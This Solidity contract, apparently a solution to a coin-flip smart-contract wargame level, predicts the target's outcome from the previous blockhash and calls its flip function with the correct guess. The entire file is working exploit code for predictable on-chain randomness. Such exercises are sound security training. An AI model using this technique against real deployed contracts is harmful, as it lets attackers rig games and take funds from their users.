// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function consecutiveWins() external view returns (uint256);
    function flip(bool) external returns (bool);
}

contract AttackCoinFlip {
    ICoinFlip private immutable target;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = ICoinFlip(_target);
    }

    function calculateGuess() private view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        return side;
    }

    // We call this function 10 times
    function flip() external {
        bool correctGuess = calculateGuess();
        require(target.flip(correctGuess), "Guess failed");
    }
}
